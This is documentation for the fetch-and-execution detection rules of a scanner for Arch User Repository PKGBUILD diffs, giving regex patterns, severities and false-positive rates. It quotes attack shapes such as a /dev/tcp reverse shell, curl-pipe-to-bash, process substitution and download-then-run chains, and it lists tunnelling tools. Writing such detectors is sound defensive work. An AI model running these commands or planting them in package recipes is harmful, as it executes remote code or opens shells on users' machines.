# Fetch and Execution

Code reaches the machine and runs. Every rule here claims one of three
things: something was fetched, something was executed, or a path connects
the two. They are the densest group in the ruleset because the shapes are
many and the claim is the same one, so a rule that only covers `curl |
bash` leaves the rest of the family open.

The pipe-to-shell rules (R001, R002) are the canonical form. R127, R137 and
R138 exist because the pipe is not required: process substitution, a
download split across two lines, and a declared `source=()` script all put
fetched code in a shell without one. R129 moves the same question to parse
time, where the fetch happens before any build step or checksum applies.

See [the rule system reference](system.md) for the field table, the
severity weights and the reserved identifier ranges.

---

### R001: Remote Script Execution {#r001}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `curl.*\|\s*(?:/bin/)?(?:bash|sh|python|zsh|dash|busybox\s+sh|source\s+/dev/stdin)`
- **Description:** Detects `curl | bash`, `curl | sh`, and variants including `python`, `zsh`, `dash`, `busybox sh`, and `source /dev/stdin`. This is the most common careless malice pattern in AUR PKGBUILDs: downloading a script and piping it directly to a shell without verification.

### R002: Wget Pipe to Shell {#r002}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `wget.*\|\s*(?:/bin/)?(?:bash|sh|python|zsh|dash|busybox\s+sh|source\s+/dev/stdin)`
- **Description:** Same as R001 but for `wget`. Separate rule per tool to allow per-tool tuning.

### R006: Insecure Download Protocol {#r006}

- **Target:** `resolved`
- **Severity:** MEDIUM (weight 15)
- **Category:** `network_execution`
- **Pattern:** `https?://.*\.tar\.gz.*\|`
- **Description:** Detects `tar.gz` piped to execution (e.g. `curl ... tar.gz | tar -x`). Originally classified as HIGH/25 and later reduced. This entry previously documented it as LOW/5 on the grounds of a fire rate above 30%, but the shipped rule is MEDIUM and it fires on **0.00%** of the 3,246-diff benign corpus; the pattern requires a pipe on the same resolved line, which is rarer than the earlier note assumed.

### R008: Unexpected File Download {#r008}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network_execution`
- **Pattern:** `\b(python|ruby|perl)\s+-c\s+https?://`
- **Description:** Detects language runtimes downloading scripts from URLs: `python -c <url>`, `ruby -c <url>`, `perl -c <url>`. An unusual pattern that indicates a runtime fetching and executing code from a remote server.

### R009: Privilege Escalation {#r009}

- **Target:** `raw_line`
- **Severity:** CRITICAL (weight 40)
- **Category:** `privilege`
- **Pattern:** `\bsudo\b`
- **Scope:** `["function_body"]` only
- **Description:** Detects `sudo` inside function bodies. Does not fire in comments, plain messages (`echo`, `printf`, `note`), or top-level declarations. Scope restriction prevents false positives from `groups=('sudo')` or `echo "sudo required"`. It *does* fire on `echo "x"; sudo ...`, since a message followed by a separator is an execution context.

### R010: Uses curl in PKGBUILD {#r010}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network_usage`
- **Pattern:** `\bcurl\s`
- **Scope:** `["function_body"]` only
- **Description:** Detects `curl` commands inside function bodies. Does not fire in comments or messages. Low severity because curl is a legitimate build tool; the presence alone is not suspicious, but combined with other signals it adds context.

### R011: Uses wget in PKGBUILD {#r011}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network_usage`
- **Pattern:** `\bwget\s`
- **Scope:** `["function_body"]` only
- **Description:** Same rationale as R010 but for `wget`. Separate rule per tool.

### R020: Network connection attempt {#r020}

- **Target:** `runtime` (resolved execution path)
- **Severity:** CRITICAL (weight 40)
- **Category:** `network`
- **Pattern:** `(?!)` (never matches)
- **Description:** A network socket opening at execution time. Shipped with a never-matching placeholder pattern because the current model cannot observe post-install behaviour from a static diff; the identifier is reserved so a future runtime probe can emit it without a baseline change.

### R022: Sensitive binary execution {#r022}

- **Target:** `runtime` (resolved execution path)
- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Pattern:** `(?!)` (never matches)
- **Description:** Execution of a sensitive binary in an unexpected position. Reserved `never-match` placeholder, as R020/R021.

### C007: Command Substitution In Source Array {#c007}

- **Severity:** CRITICAL (weight 40)
- **Condition:** An added `source=()` line contains `$(...)` or a backtick expression.
- **Description:** The source array is data, evaluated when the PKGBUILD is parsed. A command substitution there executes *before* any build function runs, and before any rule that inspects `build()` has anything to look at.

### R041: Shell Network Redirection {#r041}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `/dev/(?:tcp|udp)/`
- **Description:** Bash's `/dev/tcp` and `/dev/udp` pseudo-devices open network sockets with no external binary. The canonical reverse shell is `bash -i >& /dev/tcp/host/port 0>&1`. Matching the bare path rather than a redirection operator covers the `>&` and `exec 3<>` forms alike.

### R042: Download Then Execute {#r042}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:chmod\s+\+x[^;&|]*(?:&&|;)\s*)?(?:\./|/tmp/|bash\s|sh\s)`
- **Description:** Detects the download-then-run chain: fetch to a path, optionally `chmod +x`, then execute it. Each step alone is unremarkable; the sequence is not.

### R044: Interpreter One-Liner With Network {#r044}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network_execution`
- **Pattern:** `\b(?:python3?|perl|ruby)\s+-e\s+.*(?:socket|urllib|urlopen|Net::|LWP|open-uri|https?://)`
- **Description:** Detects an interpreter one-liner (`-e`) that references network APIs (`socket`, `urllib`, `LWP`, `Net::`) or an inline URL.

### R046: Source URL Uses IP Address {#r046}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Pattern:** `https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`
- **Description:** A source URL pointing at a bare IP address bypasses DNS and any domain reputation the bucket classifier could apply.

### R047: Source URL Uses Non-Standard Port {#r047}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network`
- **Pattern:** `https?://[^/\s:]+:(?!(?:80|443|8080|8443)(?:[/\s"\x27]|$))\d{2,5}`
- **Description:** A source URL on a port other than 80, 443, 8080, or 8443. Unusual ports suggest a service that is not a conventional distribution host.

### R048: Source URL On Free Registrar TLD {#r048}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network`
- **Pattern:** `https?://[^/\s]*\.(?:tk|ml|ga|cf|gq|pw)(?:[:/]|["\x27\s)]|$)`
- **Description:** A source URL on a free-registrar TLD (`.tk`, `.ml`, `.ga`, `.cf`, `.gq`, `.pw`). These carry no registration cost and are disproportionately used for throwaway infrastructure. Deliberately excludes `.xyz` and `.top`, which have substantial legitimate use.

### R051: Network Access In pkgver {#r051}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `packaging`
- **Scope:** `['pkgver']`
- **Pattern:** `\b(?:curl|wget|git\s+(?:clone|fetch|pull|ls-remote)|svn\s+(?:co|checkout)|hg\s+pull)\b`
- **Description:** `pkgver()` runs during version resolution, before a reviewer sees the build. Network access there executes ahead of any inspection step. Scoped to `pkgver` so that `curl` in `build()` is unaffected, and matched against fetching subcommands only; `git describe`, the standard VCS idiom, is local and must not fire.

### R055: Git Clone With Variable Branch {#r055}

- **Target:** `resolved`
- **Severity:** MEDIUM (weight 15)
- **Category:** `source`
- **Pattern:** `git\s+clone\s+[^;&|]*(?:--branch|-b)\s+\$\{?[a-zA-Z_]`
- **Description:** A `git clone --branch $var` resolves at build time to whatever the variable holds, so the pinned ref is not actually pinned.

### R056: Download Then Source {#r056}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:source|\.)\s`
- **Description:** Detects a download followed by `source` or `.`, which executes the fetched file in the current shell.

### R057: TLS Verification Disabled {#r057}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Pattern:** `(?:curl\s+(?:[^;&|]*\s)?(?:--insecure|-k)\b|wget\s+(?:[^;&|]*\s)?--no-check-certificate\b)`
- **Description:** Detects `curl --insecure` / `curl -k` and `wget --no-check-certificate`. Disabling certificate verification makes the transport trivially interceptable. The `-k` match requires a preceding word boundary so that flags such as `--keepalive-time` do not trigger it.

### R060: Critical Build Function Modified {#r060}

- **Target:** programmatic (diff-aware, defined in `src/trustsight/analysis/build.py`)
- **Severity:** INFO (weight 0)
- **Category:** `build`
- **Description:** The diff changes any line inside `build()`, `prepare()`, `check()`, or `package()`. Many supply-chain attacks add a single line to one of these functions, so this reports that an executing function was altered.

**INFO, so it contributes nothing to the score.** It fires on 21.4 % of benign diffs because maintainers rewrite build functions routinely, and no narrowing reaches triage quality: restricting to an unchanged `pkgver` still leaves 11.6 %, and the "version bump that also rewrites `build()`" case the rule was first proposed for is 9.8 %. Carrying weight it would simply add points to one benign update in five.

At weight 0 it is context for a reviewer rather than a signal, which is why it is the one rule in this group that is **on by default**.

Function membership comes from `_classify_enclosing_function()` in `rules.py`, **not** from the `@@` hunk header. The calibration corpus is generated with `git diff -W` and a custom `xfuncname`, so its hunk headers name the enclosing function, while the live pygit2 path emits none. A rule tuned on hunk headers would be calibrated against data production never produces.

On by default since v0.7.0. See [`[experimental_rules]`](../configuration.md#experimental_rules).

### R061: Hidden Network Fetch In Build {#r061}

- **Target:** programmatic (resolved command lines)
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Description:** A command inside `build()`, `prepare()`, `check()`, or `package()` downloads a URL that does not appear in `source=()`. This is the classic route around checksum verification: the declared sources verify cleanly while the real payload arrives at compile time.

The comparison is against a **source-array-scoped** URL extraction, not the general `extract_urls_from_diff()`. That helper collects URLs from any added line, including the offending `curl` line itself, so comparing against it would mean the rule could never fire. A fetch of a URL already declared in `source=()` does not fire.

On by default since v0.7.0. See [`[experimental_rules]`](../configuration.md#experimental_rules).

### R076: Version-In-URL Injection {#r076}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Condition:** `pkgver` or `_pkgver` is assigned a literal containing characters outside `[A-Za-z0-9._+-]`, and that variable is interpolated (braced or bare) into a source URL.

Both halves are required. An unsafe version string that is never interpolated
stays quiet, and an interpolated version made only of version characters is
ordinary packaging. What the rule describes is a value carrying delimiters
(`;`, whitespace, `/`) being substituted into something the build fetches.

Fire rate: 0 on all 3246 benign-corpus diffs.

### R080: Exotic Source Protocol {#r080}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Condition:** A `source=` entry uses a scheme outside the `[hosts] source_schemes` allowlist. The base of a `transport+base` token is what is judged, so `git+https://` is read as `https`.

`data:` URIs carry no `://` and are not scheme tokens, which is an accepted
gap rather than a silent pass.

Fire rate: 6 of 3246 (0.18 %).

### R087: Upload To Paste Or File-Drop Host {#r087}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25)
- **Category:** `exfil`
- **Condition:** A build or install function invokes `curl`/`wget` with a request body (an upload flag from `[patterns] upload_flags`) against a host in `[hosts] paste_hosts`.

Direction is the entire rule. The same host list also feeds the
`raw_hosting` source bucket, so a paste host in `source=()` is already carried
at +15 and a rule that fired on it would double-count that weight. What no
bucket can see is the other direction: a request leaving a build with a body
attached, addressed to a host whose purpose is to accept an anonymous drop and
hand back a link.

Fetching from one of these hosts is not this rule. A `curl` pulling a patch
from a gist is an undeclared download, which R061 already reports. Posting to
that same gist is data leaving the machine that is building the package, and it
is the evidence behind R089's `exfil` stage. On a line R087 claims, R061 stands
down: describing an upload as a download would be wrong as well as scored
twice.

The destination is an auditable list rather than a guess about what an endpoint
is for, so an upload to a project's own CI host does not fire.

Fire rate: 0 of 3246. The corpus contains one paste-host reference, a gist
download in `gamescope-nvidia`, which stays R061's.

### R123: Covert Egress {#r123}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Condition:** An added line references a `.onion`/`.i2p` host, issues a DNS-over-HTTPS query or names a configured DoH endpoint, or invokes a tunnelling client (`torsocks`, `socat`, `ngrok`, `chisel`, `frpc`, ...) at a command position inside a build or install function.

The command-position anchor is what separates use from mention: a client named
in a string or listed in `makedepends` never fires.

Fire rate: 0 of 3246.

### R129: Parse-time Network Fetch {#r129}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Condition:** A network client from `[patterns] parse_time_fetch` runs at a command position **outside every function**, in the PKGBUILD or an install file.

Everything at the top level executes as soon as makepkg sources the recipe,
which happens on `makepkg --printsrcinfo`, on an AUR helper's metadata refresh,
and on anything else that reads the file. That is before a build step runs and
before the checksum array covers anything. R010 and R011 report a downloader
inside a build function at LOW; running one at parse time is a different claim,
so it is a different rule.

Quiet by construction on declarations: `DLAGENTS=(...)` and any other
assignment whose *value* merely names a downloader configures makepkg rather
than fetching. An assignment that *runs* one through a command substitution
(`_ver=$(curl ...)`) is not a declaration and is not exempt. A fetch piped
straight into a shell belongs to R001/R002, whose claim is heavier, so R129
yields rather than scoring the same line twice.

Fire rate: 3 of 3246 (0.09 %), all one package resolving a redirect with
`curl` at the top level, which really does reach the network on a metadata
refresh.

### R120: Reconstructed Executable Payload {#r120}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** Text on an added line (base64, hex, uuencode, or an R117 reconstruction) decodes to bytes carrying ELF, shebang, PE or Mach-O magic.

This is a type check on the decoder's output, which is why one rule covers
every encoded-payload variant without naming the encoding. Encoded text assets,
checksums and keys decode to none of those magics.

Fire rate: 0 of 3246.

### R121: Build-time Generation Then Execution {#r121}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** A heredoc, `printf` or `cat >` writes a script or source file that the same function then compiles or executes.

Writing a config file, a `.desktop` entry or a patch that a declared build step
consumes is not generation-then-execution and does not fire.

Fire rate: 0 of 3246.

### R124: Write Then Execute {#r124}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** A path the recipe writes is then executed by the same function.

The execution side counts interpreters, `source`, `.`, compilers and a plain
absolute path at a command position, with or without arguments. Files that
arrived through a declared `source=` and the project's own configure/make
artefacts are exempt.

Fire rate: 0 of 3246.

### R127: Indirect Remote Execution {#r127}

- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Condition:** A fetched script reaches a shell by a path the pipe-to-shell rules do not see: process substitution (`bash <(curl ...)`), `xargs` (`curl ... | xargs bash`), or a here-string fed by command substitution (`bash <<< "$(curl ...)"`).

Each still executes remote code at build time, so it belongs with R001/R002
rather than at R010/R011's "uses curl" LOW.

### R136: Committed File Executed Without Declaration {#r136}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** An executed path is not a declared `source=()` basename, not a file the recipe wrote earlier in the same function, and not an R124-exempt build artifact, and either the path references `${startdir}`/`$startdir` or walks `../`, or the executed basename is present in the repository tree manifest under a relative path.

R121/R124 own files the recipe itself writes; R118 owns committed ELF
binaries. Between them sat the cleartext helper script: committed to the AUR
repository, never named in `source=()` (so makepkg never copies it into
`$srcdir` and its bytes never reach the differ), and executed through
`$startdir` or a `../` climb. Two signals, either sufficient: the `$startdir`
or `../` path reference (available even without a manifest), or the basename
in the tree manifest (only when a manifest was supplied - without one the rule
never guesses). An absolute `/usr/share/...` target cannot be a repository
file, however its basename collides, so the manifest signal requires a
relative path. Detected by `_committed_execution_findings()` in
`src/trustsight/analysis/delivery.py`.

### R137: Fetch Then Execute {#r137}

- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Condition:** Inside a build/package/check/prepare function (install hooks already have R062), a line downloads to a file with `curl`/`wget`/`aria2c`/`axel` (`-o`, `--output`, `--output-document`, or `>` form) and the same function later executes that file.

This is `curl -o stage.sh ... ; bash stage.sh` split across lines so the
pipe-to-shell regex (R001/R002) never sees the `|`. Files that arrived via
the declared `source=()` array are deliberately excluded - they have their
own rule (R138), so checksum-bearing source files are not double-counted.
Detected by `_fetch_then_execute_findings()` in
`src/trustsight/analysis/delivery.py`.

### R138: Downloaded Source File Executed {#r138}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** An interpreter (`bash`/`sh`/`zsh`/`dash`/`ksh`/`python`/`perl`/`ruby`), `source`, `.` or `./` form executes a file whose basename is declared in the `source=()` array.

Checksums protect integrity, not intent: a `source=(... .sh)` followed by
`bash "$srcdir/that.sh"` is remote code execution just like `curl | bash`,
only hidden behind the ordinary download path. Build-system scripts
(`configure`, `make`, `meson`, `ninja`, `cmake`) are common declared-source
executables and stay silent; the rule targets interpreted execution of a
downloaded script. Detected by `_source_file_execution_findings()` in
`src/trustsight/analysis/delivery.py`.
